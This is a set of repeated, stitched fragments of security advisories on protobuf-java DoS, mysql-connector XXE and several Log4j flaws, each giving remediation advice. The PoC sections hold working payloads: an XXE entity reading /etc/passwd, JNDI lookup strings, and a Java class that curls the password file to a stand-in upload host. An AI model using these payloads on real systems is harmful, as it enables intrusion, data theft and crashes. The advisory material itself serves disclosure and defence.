An issue in protobuf-java allowed the interleaving of `com.google.protobuf.UnknownFieldSet` fields in such a way that would be processed out of order. A small malicious payload can occupy the parser for several minutes by creating large numbers of short-lived objects that cause frequent, repeated pauses.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `com.google.protobuf:protobuf-java` to version 3.19.2, 3.18.2, 3.16.1 or higher.\n## References\n- [Chromium Bugs](https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=39330)\n- [Google Cloud Security Bulletin](https://cloud.google.com/support/bulletins#gcp-2022-001)\n",

By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\n\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\n\nFor example, below is a sample XML document, containing an XML element- username.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n   <username>John</username>\n</xml>\n```\n\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n   <username>&xxe;</username>\n</xml>\n```\n\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\n\n## Remediation\nUpgrade `mysql:mysql-connector-java` to version 8.0.27 or higher.\n## References\n- [GitHub Commit](https://github.com/mysql/mysql-connector-j/commit/4993d5735fd84a46e7d949ad1bcaa0e9bb039824)\n- [PoC](https://pyn3rd.github.io/2021/10/22/mysql-jdbc-xxe/)\n",

      "description": "## Overview\n\n[org.apache.logging.log4j:log4j-core](http://logging.apache.org/log4j/1.2/) is a logging library for Java.\n\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE).\nApache Log4j2 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.\r\n\r\nFrom log4j 2.15.0, JNDI LDAP endpoints are restricted to localhost by default.\r\n\r\n\r\n## PoC\r\nWhen an application uses log4j to log user input, an attacker can exploit this vulnerability, by supplying a malicious string that the application logs - for example,  `${jndi:ldap://someurl/Evil}`. This causes the application to execute a malicious class supplied by an attacker’s LDAP server (`someurl/Evil` in this example).\r\n\r\nFor example, the vulnerability can be used to inject this malicious class into an application:\r\n```java\r\npublic class Evil implements ObjectFactory  {\r\n   @Override\r\n   public Object getObjectInstance (Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)  throws Exception {\r\n       Runtime.getRuntime().exec(\"curl -F 'file=@/etc/passw‍đ' https://someurl/upload\");\r\n       return  null;\r\n   }\r\n}\r\n```\r\nThis causes the application to disclose the `etc/passwd` file on the system, and send it to a remote attacker.\r\n\r\n## Further Remediation Options\r\nIf upgrading the version is not possible, we strongly recommend to mitigate the vulnerability using one of these methods:\r\n\r\n* Remove `JndiLookup.class` from the class path (i.e: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`. While not pertinent to log4shell, consider also removing `JndiManager`, `JMSAppender` and `SMTPAppender` if you are not using them, as there are unconfirmed reports they could be leveraged in similar attacks in the future.\r\n* Partial mitigation: disable lookups via system properties or environmental variables. If you use log4j >=2.10.0, you can set the system property `LOG4J_FORMAT_MSG_NO_LOOKUPS` or the environmental variable `Dlog4j2.formatMsgNoLookups` to `true`. (RCE is possible in some non-default Pattern Layout configurations that use a Context Lookup or a Thread Context Map pattern.)\r\n\r\n<br>Upgrading your JDK versions is not enough to mitigate this vulnerability in all circumstances, as it was proven that setting the `com.sun.jndi.ldap.object.trustURLCodebase` property to `false` is not enough.\r\n<br>For more remediation advice, please visit the [Log4j Remediation Cheat Sheet](https://snyk.io/blog/log4shell-remediation-cheat-sheet/) post.\r\n\r\n\r\n**Note**: `org.apache.logging.log4j:log4j-api` was originally deemed vulnerable, but Apache maintainers have since [clarified](https://issues.apache.org/jira/browse/LOG4J2-3201) that this only affects `org.apache.logging.log4j:log4j-core`.\n\n## Remediation\n\nUpgrade `org.apache.logging.log4j:log4j-core` to version 2.3.1, 2.12.2, 2.15.0 or higher.\n\n\nUse [this guide](https://snyk.io/blog/find-fix-log4shell-quickly-snyk/) to scan your projects for the Log4Shell vulnerability.\n\n## References\n\n- [Apache Jira Issues](https://issues.apache.org/jira/browse/LOG4J2-3198)\n\n- [Apache Jira Issues](https://issues.apache.org/jira/browse/LOG4J2-3201)\n\n- [Apache Security Advisory](https://logging.apache.org/log4j/2.x/security.html)\n\n- [GitHub PR](https://github.com/apache/logging-log4j2/pull/608)\n\n- [PoC](https://github.com/Kirill89/log4shell-vulnerable-server)\n\n- [Snyk Blog and Vulnerability Breakdown](https://snyk.io/blog/log4j-rce-log4shell-vulnerability-cve-2021-4428/)\n",

Logging configuration explicitly enables lookups – either by default (if using a version lower than 2.15.0) or manually by using `%m{lookups}` as `formatMsgNoLookups` is switched on by default as of version 2.15.0.\r\n2. Or uses a non-default Pattern Layout with Context Lookup where attackers can control input data via Thread Context Map (MDC),\r\n3. Or uses `Logger.printf(\"%s\", userInput)` function where attackers can control the userInput variable.\r\n\r\nA malicious actor is able to bypass the mitigation implemented in version 2.15.0 that limits JNDI lookups to localhost only: `${jndi:ldap://127.0.0.1#evilhost.com:1389/a}`.\r\n\r\nWe recommend updating to version 2.16.0 which completely disables JNDI lookups by default. If upgrading is not an option, this issue can be mitigated in prior releases by removing the `JndiLookup` class from the classpath (example: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`).\r\n\r\n### PoC\r\n\r\nIn config:\r\n```\r\n<pattern>%d %p %c{1.} [%t] $${ctx:loginId} %m%n</pattern>\r\n```\r\n\r\nIn code:\r\n```java\r\nThreadContext.put(\"loginId\", UserControlledInput);\r\n```\r\n\r\n### History\r\n\r\nThis vulnerability was previously assigned a CVSS score of 3.7 (Low), and the impact was believed to be Denial of Service (DoS).\r\n\r\nFurthermore, the advisory previously mentioned Thread Context Map patterns (%X, %mdc, or %MDC) as being vulnerable to this issue, but that has since been proven wrong.\r\n\r\nOn December 17, 2021 new information came to light, demonstrating that an Arbitrary Code Execution vulnerability still exists in version 2.15.0 of Log4j due to a bypass to the localhost-only lookup mechanism.\n## Remediation\nUpgrade `org.apache.logging.log4j:log4j-core` to version 2.3.1, 2.12.2, 2.16.0 or higher.\n## References\n- [Apache Pony Mail](https://lists.apache.org/thread/83y7dx5xvn3h5290q1twn16tltolv88f)\n- [Apache Security Page](https://logging.apache.org/log4j/2.x/security.html)\n- [Twitter Post](https://twitter.com/marcioalm/status/1471740771581652995)\n",

Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash.

An issue in protobuf-java allowed the interleaving of `com.google.protobuf.UnknownFieldSet` fields in such a way that would be processed out of order. A small malicious payload can occupy the parser for several minutes by creating large numbers of short-lived objects that cause frequent, repeated pauses.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `com.google.protobuf:protobuf-java` to version 3.19.2, 3.18.2, 3.16.1 or higher.\n## References\n- [Chromium Bugs](https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=39330)\n- [Google Cloud Security Bulletin](https://cloud.google.com/support/bulletins#gcp-2022-001)\n",

By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\n\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\n\nFor example, below is a sample XML document, containing an XML element- username.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n   <username>John</username>\n</xml>\n```\n\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n   <username>&xxe;</username>\n</xml>\n```\n\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\n\n## Remediation\nUpgrade `mysql:mysql-connector-java` to version 8.0.27 or higher.\n## References\n- [GitHub Commit](https://github.com/mysql/mysql-connector-j/commit/4993d5735fd84a46e7d949ad1bcaa0e9bb039824)\n- [PoC](https://pyn3rd.github.io/2021/10/22/mysql-jdbc-xxe/)\n",

        "description": "## Overview\n\n[org.apache.logging.log4j:log4j-core](http://logging.apache.org/log4j/1.2/) is a logging library for Java.\n\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE).\nApache Log4j2 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.\r\n\r\nFrom log4j 2.15.0, JNDI LDAP endpoints are restricted to localhost by default.\r\n\r\n\r\n## PoC\r\nWhen an application uses log4j to log user input, an attacker can exploit this vulnerability, by supplying a malicious string that the application logs - for example,  `${jndi:ldap://someurl/Evil}`. This causes the application to execute a malicious class supplied by an attacker’s LDAP server (`someurl/Evil` in this example).\r\n\r\nFor example, the vulnerability can be used to inject this malicious class into an application:\r\n```java\r\npublic class Evil implements ObjectFactory  {\r\n   @Override\r\n   public Object getObjectInstance (Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)  throws Exception {\r\n       Runtime.getRuntime().exec(\"curl -F 'file=@/etc/passw‍đ' https://someurl/upload\");\r\n       return  null;\r\n   }\r\n}\r\n```\r\nThis causes the application to disclose the `etc/passwd` file on the system, and send it to a remote attacker.\r\n\r\n## Further Remediation Options\r\nIf upgrading the version is not possible, we strongly recommend to mitigate the vulnerability using one of these methods:\r\n\r\n* Remove `JndiLookup.class` from the class path (i.e: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`. While not pertinent to log4shell, consider also removing `JndiManager`, `JMSAppender` and `SMTPAppender` if you are not using them, as there are unconfirmed reports they could be leveraged in similar attacks in the future.\r\n* Partial mitigation: disable lookups via system properties or environmental variables. If you use log4j >=2.10.0, you can set the system property `LOG4J_FORMAT_MSG_NO_LOOKUPS` or the environmental variable `Dlog4j2.formatMsgNoLookups` to `true`. (RCE is possible in some non-default Pattern Layout configurations that use a Context Lookup or a Thread Context Map pattern.)\r\n\r\n<br>Upgrading your JDK versions is not enough to mitigate this vulnerability in all circumstances, as it was proven that setting the `com.sun.jndi.ldap.object.trustURLCodebase` property to `false` is not enough.\r\n<br>For more remediation advice, please visit the [Log4j Remediation Cheat Sheet](https://snyk.io/blog/log4shell-remediation-cheat-sheet/) post.\r\n\r\n\r\n**Note**: `org.apache.logging.log4j:log4j-api` was originally deemed vulnerable, but Apache maintainers have since [clarified](https://issues.apache.org/jira/browse/LOG4J2-3201) that this only affects `org.apache.logging.log4j:log4j-core`.\n\n## Remediation\n\nUpgrade `org.apache.logging.log4j:log4j-core` to version 2.3.1, 2.12.2, 2.15.0 or higher.\n\n\nUse [this guide](https://snyk.io/blog/find-fix-log4shell-quickly-snyk/) to scan your projects for the Log4Shell vulnerability.\n\n## References\n\n- [Apache Jira Issues](https://issues.apache.org/jira/browse/LOG4J2-3198)\n\n- [Apache Jira Issues](https://issues.apache.org/jira/browse/LOG4J2-3201)\n\n- [Apache Security Advisory](https://logging.apache.org/log4j/2.x/security.html)\n\n- [GitHub PR](https://github.com/apache/logging-log4j2/pull/608)\n\n- [PoC](https://github.com/Kirill89/log4shell-vulnerable-server)\n\n- [Snyk Blog and Vulnerability Breakdown](https://snyk.io/blog/log4j-rce-log4shell-vulnerability-cve-2021-4428/)\n",

Logging configuration explicitly enables lookups – either by default (if using a version lower than 2.15.0) or manually by using `%m{lookups}` as `formatMsgNoLookups` is switched on by default as of version 2.15.0.\r\n2. Or uses a non-default Pattern Layout with Context Lookup where attackers can control input data via Thread Context Map (MDC),\r\n3. Or uses `Logger.printf(\"%s\", userInput)` function where attackers can control the userInput variable.\r\n\r\nA malicious actor is able to bypass the mitigation implemented in version 2.15.0 that limits JNDI lookups to localhost only: `${jndi:ldap://127.0.0.1#evilhost.com:1389/a}`.\r\n\r\nWe recommend updating to version 2.16.0 which completely disables JNDI lookups by default. If upgrading is not an option, this issue can be mitigated in prior releases by removing the `JndiLookup` class from the classpath (example: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`).\r\n\r\n### PoC\r\n\r\nIn config:\r\n```\r\n<pattern>%d %p %c{1.} [%t] $${ctx:loginId} %m%n</pattern>\r\n```\r\n\r\nIn code:\r\n```java\r\nThreadContext.put(\"loginId\", UserControlledInput);\r\n```\r\n\r\n### History\r\n\r\nThis vulnerability was previously assigned a CVSS score of 3.7 (Low), and the impact was believed to be Denial of Service (DoS).\r\n\r\nFurthermore, the advisory previously mentioned Thread Context Map patterns (%X, %mdc, or %MDC) as being vulnerable to this issue, but that has since been proven wrong.\r\n\r\nOn December 17, 2021 new information came to light, demonstrating that an Arbitrary Code Execution vulnerability still exists in version 2.15.0 of Log4j due to a bypass to the localhost-only lookup mechanism.\n## Remediation\nUpgrade `org.apache.logging.log4j:log4j-core` to version 2.3.1, 2.12.2, 2.16.0 or higher.\n## References\n- [Apache Pony Mail](https://lists.apache.org/thread/83y7dx5xvn3h5290q1twn16tltolv88f)\n- [Apache Security Page](https://logging.apache.org/log4j/2.x/security.html)\n- [Twitter Post](https://twitter.com/marcioalm/status/1471740771581652995)\n",

Does not protect against uncontrolled recursion from self-referential lookups. \r\n\r\nWhen the logging configuration uses a non-default Pattern Layout with a Context Lookup (for example, `$${ctx:loginId}`), attackers with control over Thread Context Map (MDC) input data can craft malicious input data that contains a recursive lookup, resulting in a `StackOverflowError` that will terminate the process.\r\n\r\n### PoC\r\n\r\nIn `log4j.properties`:\r\n```java\r\nappender.console.type = Console\r\nappender.console.name = console\r\nappender.console.layout.type = PatternLayout\r\nappender.console.layout.pattern = !${ctx:test}! %m%n\r\nrootLogger.level = ALL\r\nrootLogger.appenderRef.file.ref = console\r\n```\r\n\r\nIn `Main.java`:\r\n```java\r\nThreadContext.put(\"test\", \"${::-${ctx:test}}\");\r\nlogger.error(\"boom\"); // Will not be logged\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash.
